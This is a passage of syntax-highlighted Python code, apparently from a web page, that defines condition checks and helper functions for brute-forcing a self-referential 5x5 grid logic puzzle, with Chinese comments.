<a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">cond_04</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">a_s</span><span class="p">):</span> <span class="k">return</span> <span class="nb">any</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">axis</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">5</span><span class="p">)</span>
<a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a>
<a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a>    <span class="c1"># 第 2 行</span>
<a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">cond_10</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">a_s</span><span class="p">):</span> <span class="k">return</span> <span class="n">g</span><span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span>
<a id="__codelineno-0-39" name="__codelineno-0-39" href="#__codelineno-0-39"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">cond_11</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">a_s</span><span class="p">):</span>
<a id="__codelineno-0-40" name="__codelineno-0-40" href="#__codelineno-0-40"></a>        <span class="n">odd_rows</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="mi">1</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="k">if</span> <span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">g</span><span class="p">[</span><span class="n">r</span><span class="p">,</span> <span class="p">:])</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
<a id="__codelineno-0-41" name="__codelineno-0-41" href="#__codelineno-0-41"></a>        <span class="k">return</span> <span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">g</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">13</span><span class="p">)</span> <span class="o">!=</span> <span class="p">(</span><span class="n">odd_rows</span> <span class="o">&gt;=</span> <span class="mi">2</span><span class="p">)</span>
<a id="__codelineno-0-42" name="__codelineno-0-42" href="#__codelineno-0-42"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">cond_12</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">a_s</span><span class="p">):</span> <span class="k">return</span> <span class="nb">sum</span><span class="p">(</span><span class="mi">1</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="k">if</span> <span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">g</span><span class="p">[</span><span class="n">r</span><span class="p">,</span> <span class="p">:])</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span>
<a id="__codelineno-0-43" name="__codelineno-0-43" href="#__codelineno-0-43"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">cond_13</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">a_s</span><span class="p">):</span> <span class="k">return</span> <span class="ow">not</span> <span class="n">is_prime</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># 恒为 True</span>
<a id="__codelineno-0-44" name="__codelineno-0-44" href="#__codelineno-0-44"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">cond_14</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">a_s</span><span class="p">):</span>
<a id="__codelineno-0-45" name="__codelineno-0-45" href="#__codelineno-0-45"></a>        <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
<a id="__codelineno-0-46" name="__codelineno-0-46" href="#__codelineno-0-46"></a>            <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
<a id="__codelineno-0-47" name="__codelineno-0-47" href="#__codelineno-0-47"></a>                <span class="k">if</span> <span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">g</span><span class="p">[</span><span class="n">r</span><span class="p">:</span><span class="n">r</span><span class="o">+</span><span class="mi">2</span><span class="p">,</span> <span class="n">c</span><span class="p">:</span><span class="n">c</span><span class="o">+</span><span class="mi">2</span><span class="p">])</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span> <span class="k">return</span> <span class="kc">True</span>
<a id="__codelineno-0-48" name="__codelineno-0-48" href="#__codelineno-0-48"></a>        <span class="k">return</span> <span class="kc">False</span>
<a id="__codelineno-0-49" name="__codelineno-0-49" href="#__codelineno-0-49"></a>
<a id="__codelineno-0-50" name="__codelineno-0-50" href="#__codelineno-0-50"></a>    <span class="c1"># 第 3 行</span>
<a id="__codelineno-0-51" name="__codelineno-0-51" href="#__codelineno-0-51"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">cond_20</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">a_s</span><span class="p">):</span> <span class="c1"># 中心格为 1，且两条对角线上的 1 数为合数</span>
<a id="__codelineno-0-52" name="__codelineno-0-52" href="#__codelineno-0-52"></a>        <span class="k">if</span> <span class="n">g</span><span class="p">[</span><span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span> <span class="k">return</span> <span class="kc">False</span>
<a id="__codelineno-0-53" name="__codelineno-0-53" href="#__codelineno-0-53"></a>        <span class="n">total_diag_ones</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">trace</span><span class="p">(</span><span class="n">g</span><span class="p">)</span> <span class="o">+</span> <span class="n">np</span><span class="o">.</span><span class="n">trace</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">fliplr</span><span class="p">(</span><span class="n">g</span><span class="p">))</span> <span class="o">-</span> <span class="n">g</span><span class="p">[</span><span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">]</span>
<a id="__codelineno-0-54" name="__codelineno-0-54" href="#__codelineno-0-54"></a>        <span class="k">return</span> <span class="n">is_composite</span><span class="p">(</span><span class="n">total_diag_ones</span><span class="p">)</span>
<a id="__codelineno-0-55" name="__codelineno-0-55" href="#__codelineno-0-55"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">cond_21</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">a_s</span><span class="p">):</span> <span class="c1"># 左上 3×3 区域至少 5 个为 1</span>
<a id="__codelineno-0-56" name="__codelineno-0-56" href="#__codelineno-0-56"></a>        <span class="k">return</span> <span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">g</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">:</span><span class="mi">3</span><span class="p">])</span> <span class="o">&gt;=</span> <span class="mi">5</span>
<a id="__codelineno-0-57" name="__codelineno-0-57" href="#__codelineno-0-57"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">cond_22</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">a_s</span><span class="p">):</span> <span class="c1"># 上下相邻均为1的格对不少于四对</span>
<a id="__codelineno-0-58" name="__codelineno-0-58" href="#__codelineno-0-58"></a>        <span class="c1"># 澄清：这是全局计数，计算有多少对 g[r,c]和g[r+1,c] 均为1。</span>
<a id="__codelineno-0-59" name="__codelineno-0-59" href="#__codelineno-0-59"></a>        <span class="n">pairs</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="mi">1</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="k">if</span> <span class="n">g</span><span class="p">[</span><span class="n">r</span><span class="p">,</span> <span class="n">c</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">g</span><span class="p">[</span><span class="n">r</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="n">c</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
<a id="__codelineno-0-60" name="__codelineno-0-60" href="#__codelineno-0-60"></a>        <span class="k">return</span> <span class="n">pairs</span> <span class="o">&gt;=</span> <span class="mi">4</span>
<a id="__codelineno-0-61" name="__codelineno-0-61" href="#__codelineno-0-61"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">cond_23</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">a_s</span><span class="p">):</span> <span class="c1"># 上下相邻均为1的格对不多于六对</span>
<a id="__codelineno-0-62" name="__codelineno-0-62" href="#__codelineno-0-62"></a>        <span class="c1"># 澄清：同上，这是全局计数。</span>
<a id="__codelineno-0-63" name="__codelineno-0-63" href="#__codelineno-0-63"></a>        <span class="n">pairs</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="mi">1</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="k">if</span> <span class="n">g</span><span class="p">[</span><span class="n">r</span><span class="p">,</span> <span class="n">c</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">g</span><span class="p">[</span><span class="n">r</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="n">c</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
<a id="__codelineno-0-64" name="__codelineno-0-64" href="#__codelineno-0-64"></a>        <span class="k">return</span> <span class="n">pairs</span> <span class="o">&lt;=</span> <span class="mi">6</span>
<a id="__codelineno-0-65" name="__codelineno-0-65" href="#__codelineno-0-65"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">cond_24</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">a_s</span><span class="p">):</span> <span class="c1"># 答案不是对角线</span>
<a id="__codelineno-0-66" name="__codelineno-0-66" href="#__codelineno-0-66"></a>        <span class="k">return</span> <span class="n">a_s</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">&#39;diag&#39;</span><span class="p">,</span> <span class="s1">&#39;anti_diag&#39;</span><span class="p">]</span>
<a id="__codelineno-0-67" name="__codelineno-0-67" href="#__codelineno-0-67"></a>
<a id="__codelineno-0-68" name="__codelineno-0-68" href="#__codelineno-0-68"></a>    <span class="c1"># 第 4 行</span>
<a id="__codelineno-0-69" name="__codelineno-0-69" href="#__codelineno-0-69"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">cond_30</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">a_s</span><span class="p">):</span> <span class="c1"># 此格相邻三格的勾数为偶数</span>
<a id="__codelineno-0-70" name="__codelineno-0-70" href="#__codelineno-0-70"></a>        <span class="k">return</span> <span class="p">(</span><span class="n">g</span><span class="p">[</span><span class="mi">3</span><span class="p">,</span> <span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">g</span><span class="p">[</span><span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">g</span><span class="p">[</span><span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">])</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span>
<a id="__codelineno-0-71" name="__codelineno-0-71" href="#__codelineno-0-71"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">cond_31</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">a_s</span><span class="p">):</span>
<a id="__codelineno-0-72" name="__codelineno-0-72" href="#__codelineno-0-72"></a>        <span class="n">a</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">g</span><span class="p">[</span><span class="mi">3</span><span class="p">,</span> <span class="p">:]);</span> <span class="n">b</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">g</span><span class="p">[:,</span> <span class="mi">1</span><span class="p">])</span>
<a id="__codelineno-0-73" name="__codelineno-0-73" href="#__codelineno-0-73"></a>        <span class="k">return</span> <span class="p">(</span><span class="n">a</span><span class="o">*</span><span class="n">a</span> <span class="o">+</span> <span class="n">b</span><span class="p">)</span> <span class="o">%</span> <span class="mi">5</span> <span class="o">&lt;=</span> <span class="mi">3</span> <span class="ow">and</span> <span class="n">a</span> <span class="o">&lt;=</span> <span class="n">b</span>
<a id="__codelineno-0-74" name="__codelineno-0-74" href="#__codelineno-0-74"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">cond_32</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">a_s</span><span class="p">):</span> <span class="c1"># 全体勾的重心不偏右</span>
<a id="__codelineno-0-75" name="__codelineno-0-75" href="#__codelineno-0-75"></a>        <span class="n">total_ticks</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">g</span><span class="p">)</span>
<a id="__codelineno-0-76" name="__codelineno-0-76" href="#__codelineno-0-76"></a>        <span class="k">if</span> <span class="n">total_ticks</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span> <span class="k">return</span> <span class="kc">True</span>
<a id="__codelineno-0-77" name="__codelineno-0-77" href="#__codelineno-0-77"></a>        <span class="n">weighted_sum</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="n">c</span> <span class="o">*</span> <span class="n">g</span><span class="p">[</span><span class="n">r</span><span class="p">,</span> <span class="n">c</span><span class="p">]</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span>
<a id="__codelineno-0-78" name="__codelineno-0-78" href="#__codelineno-0-78"></a>        <span class="k">return</span> <span class="p">(</span><span class="n">weighted_sum</span> <span class="o">/</span> <span class="n">total_ticks</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mf">2.0</span>
<a id="__codelineno-0-79" name="__codelineno-0-79" href="#__codelineno-0-79"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">cond_33</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">a_s</span><span class="p">):</span> <span class="c1"># 此行不是正确答案</span>
<a id="__codelineno-0-80" name="__codelineno-0-80" href="#__codelineno-0-80"></a>        <span class="k">return</span> <span class="ow">not</span> <span class="p">(</span><span class="n">a_s</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;row&#39;</span> <span class="ow">and</span> <span class="n">a_s</span><span class="p">[</span><span class="s1">&#39;index&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span>
<a id="__codelineno-0-81" name="__codelineno-0-81" href="#__codelineno-0-81"></a>
<a id="__codelineno-0-82" name="__codelineno-0-82" href="#__codelineno-0-82"></a>    <span class="c1"># !!!!!!!!!!!!!!!!  已应用关键逻辑修正 !!!!!!!!!!!!!!!!</span>
<a id="__codelineno-0-83" name="__codelineno-0-83" href="#__codelineno-0-83"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">cond_34</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">a_s</span><span class="p">):</span> <span class="c1"># 如果没有...此题不可解</span>
<a id="__codelineno-0-84" name="__codelineno-0-84" href="#__codelineno-0-84"></a>        <span class="c1"># 新逻辑：我们的暴力方法没有“逻辑起点”，因此前提为真。</span>
<a id="__codelineno-0-85" name="__codelineno-0-85" href="#__codelineno-0-85"></a>        <span class="c1"># 我们假设此题可解，因此结论“不可解”为假。</span>
<a id="__codelineno-0-86" name="__codelineno-0-86" href="#__codelineno-0-86"></a>        <span class="c1"># 所以 &quot;IF 真 THEN 假&quot; -&gt; 整个陈述为 False。</span>
<a id="__codelineno-0-87" name="__codelineno-0-87" href="#__codelineno-0-87"></a>        <span class="k">return</span> <span class="kc">False</span>
<a id="__codelineno-0-88" name="__codelineno-0-88" href="#__codelineno-0-88"></a>    <span class="c1"># !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</span>
<a id="__codelineno-0-89" name="__codelineno-0-89" href="#__codelineno-0-89"></a>
<a id="__codelineno-0-90" name="__codelineno-0-90" href="#__codelineno-0-90"></a>    <span class="c1"># 第 5 行</span>
<a id="__codelineno-0-91" name="__codelineno-0-91" href="#__codelineno-0-91"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">cond_40</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">a_s</span><span class="p">):</span> <span class="k">return</span> <span class="n">is_composite</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">g</span><span class="p">[:,</span> <span class="mi">3</span><span class="p">])</span> <span class="o">+</span> <span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">g</span><span class="p">[:,</span> <span class="mi">1</span><span class="p">]))</span>
<a id="__codelineno-0-92" name="__codelineno-0-92" href="#__codelineno-0-92"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">cond_41</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">a_s</span><span class="p">):</span> <span class="c1"># 1 不是合数 XOR 此列是正确答案</span>
<a id="__codelineno-0-93" name="__codelineno-0-93" href="#__codelineno-0-93"></a>        <span class="k">return</span> <span class="kc">True</span> <span class="o">!=</span> <span class="p">(</span><span class="n">a_s</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;col&#39;</span> <span class="ow">and</span> <span class="n">a_s</span><span class="p">[</span><span class="s1">&#39;index&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
<a id="__codelineno-0-94" name="__codelineno-0-94" href="#__codelineno-0-94"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">cond_42</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">a_s</span><span class="p">):</span> <span class="c1"># 此列是勾数唯一最少的列</span>
<a id="__codelineno-0-95" name="__codelineno-0-95" href="#__codelineno-0-95"></a>        <span class="n">col_sums</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">axis</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
<a id="__codelineno-0-96" name="__codelineno-0-96" href="#__codelineno-0-96"></a>        <span class="k">return</span> <span class="nb">all</span><span class="p">(</span><span class="n">col_sums</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">s</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">s</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">col_sums</span><span class="p">)</span> <span class="k">if</span> <span class="n">i</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span>
<a id="__codelineno-0-97" name="__codelineno-0-97" href="#__codelineno-0-97"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">cond_43</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">a_s</span><span class="p">):</span>
<a id="__codelineno-0-98" name="__codelineno-0-98" href="#__codelineno-0-98"></a>        <span class="n">row_has_3</span> <span class="o">=</span> <span class="nb">any</span><span class="p">(</span><span class="s2">&quot;111&quot;</span> <span class="ow">in</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">str</span><span class="p">,</span> <span class="n">g</span><span class="p">[</span><span class="n">r</span><span class="p">,</span> <span class="p">:]))</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span>
<a id="__codelineno-0-99" name="__codelineno-0-99" href="#__codelineno-0-99"></a>        <span class="n">col_has_3</span> <span class="o">=</span> <span class="nb">any</span><span class="p">(</span><span class="s2">&quot;111&quot;</span> <span class="ow">in</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">str</span><span class="p">,</span> <span class="n">g</span><span class="p">[:,</span> <span class="n">c</span><span class="p">]))</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span>
<a id="__codelineno-0-100" name="__codelineno-0-100" href="#__codelineno-0-100"></a>        <span class="k">return</span> <span class="n">row_has_3</span> <span class="ow">and</span> <span class="n">col_has_3</span>
<a id="__codelineno-0-101" name="__codelineno-0-101" href="#__codelineno-0-101"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">cond_44</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">a_s</span><span class="p">):</span>
<a id="__codelineno-0-102" name="__codelineno-0-102" href="#__codelineno-0-102"></a>        <span class="k">return</span> <span class="n">np</span><span class="o">.</span><span class="n">trace</span><span class="p">(</span><span class="n">g</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span> <span class="ow">and</span> <span class="n">np</span><span class="o">.</span><span class="n">trace</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">fliplr</span><span class="p">(</span><span class="n">g</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">3</span>
<a id="__codelineno-0-103" name="__codelineno-0-103" href="#__codelineno-0-103"></a>
<a id="__codelineno-0-104" name="__codelineno-0-104" href="#__codelineno-0-104"></a><span class="k">def</span><span class="w"> </span><span class="nf">check_grid_consistency</span><span class="p">(</span><span class="n">grid</span><span class="p">,</span> <span class="n">assumed_solution</span><span class="p">,</span> <span class="n">verifier</span><span class="p">):</span>
<a id="__codelineno-0-105" name="__codelineno-0-105" href="#__codelineno-0-105"></a>    <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
<a id="__codelineno-0-106" name="__codelineno-0-106" href="#__codelineno-0-106"></a>        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
<a id="__codelineno-0-107" name="__codelineno-0-107" href="#__codelineno-0-107"></a>            <span class="k">if</span> <span class="nb">bool</span><span class="p">(</span><span class="n">grid</span><span class="p">[</span><span class="n">r</span><span class="p">,</span> <span class="n">c</span><span class="p">])</span> <span class="o">!=</span> <span class="n">verifier</span><span class="o">.</span><span class="n">conditions</span><span class="p">[</span><span class="n">r</span><span class="p">][</span><span class="n">c</span><span class="p">](</span><span class="n">grid</span><span class="p">,</span> <span class="n">assumed_solution</span><span class="p">):</span>
<a id="__codelineno-0-108" name="__codelineno-0-108" href="#__codelineno-0-108"></a>                <span class="k">return</span> <span class="kc">False</span>
<a id="__codelineno-0-109" name="__codelineno-0-109" href="#__codelineno-0-109"></a>    <span class="k">return</span> <span class="kc">True</span>
<a id="__codelineno-0-110" name="__codelineno-0-110" href="#__codelineno-0-110"></a>
<a id="__codelineno-0-111" name="__codelineno-0-111" href="#__codelineno-0-111"></a><span class="k">def</span><span class="w"> </span><span class="nf">count_full_lines</span><span class="p">(</span><span class="n">grid</span><span class="p">):</span>
<a id="__codelineno-0-112" name="__codelineno-0-112" href="#__codelineno-0-112"></a>    <span class="n">count</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="mi">1</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="k">if</span> <span class="n">np</span><span class="o">.</span><span class="n">all</span><span class="p">(</span><span class="n">grid</span><span class="p">[</span><span class="n">r</span><span class="p">,</span> <span class="p">:]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">))</span>
<a id="__codelineno-0-113" name="__codelineno-0-113" href="#__codelineno-0-113"></a>    <span class="n">count</span> <span class="o">+=</span> <span class="nb">sum</span><span class="p">(</span><span class="mi">1</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="k">if</span> <span class="n">np</span><span class="o">.</span><span class="n">all</span><span class="p">(</span><span class="n">grid</span><span class="p">[:,</span> <span class="n">c</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">))</span>
<a id="__codelineno-0-114" name="__codelineno-0-114" href="#__codelineno-0-114"></a>    <span class="k">if</span> <span class="n">np</span><span class="o">.</span><span class="n">all</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">diag</span><span class="p">(</span><span class="n">grid</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">):</span> <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
<a id="__codelineno-0-115" name="__codelineno-0-115" href="#__codelineno-0-115"></a>    <span class="k">if</span> <span class="n">np</span><span class="o">.</span><span class="n">all</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">diag</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">fliplr</span><span class="p">(</span><span class="n">grid</span><span class="p">))</span> <span class="o">==</span> <span class="mi">1</span><span class="p">):</span> <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
<a id="__codelineno-0-116" name="__codelineno-0-116" href="#__codelineno-0-116"></a>    <span class="k">return</span> <span class="n">count</span>
<a id="__codelineno-0-117" name="__codelineno-0-117" href="#__codelineno-0-117"></a>
<a id="__codelineno-0-118" name="__codelineno-0-118" href="#__codelineno-0-118"></a><span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
<a id="__codelineno-0-119" name="__codelineno-0-119" href="#__codelineno-0-119"></a>    <span class="n">verifier</span> <span class="o">=</span> <span class="n">PuzzleVerifier</span><span class="p">()</span>
<a id="__codelineno-0-120" name="__codelineno-0-120" href="#__codelineno-0-120"></a>    <span class="n">possible_solutions</span> <span class="o">=</span> <span class="p">[]</span>
<a id="__codelineno-0-121" name="__codelineno-0-121" href="#__codelineno-0-121"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span> <span class="n">possible_solutions</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s1">&#39;type&#39;</span><span class="p">:</span> <span class="s1">&#39;row&#39;</span><span class="p">,</span> <span class="s1">&#39;index&#39;</span><span class="p">:</span> <span class="n">i</span><span class="p">,</span> <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;第 </span><span class="si">{</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s1"> 行&#39;</span><span class="p">})</span>
<a id="__codelineno-0-122" name="__codelineno-0-122" href="#__codelineno-0-122"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span> <span class="n">possible_solutions</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s1">&#39;type&#39;</span><span class="p">:</span> <span class="s1">&#39;col&#39;</span><span class="p">,</span> <span class="s1">&#39;index&#39;</span><span class="p">:</span> <span class="n">i</span><span class="p">,</span> <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;第 </span><span class="si">{</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s1"> 列&#39;</span><span class="p">})</span>
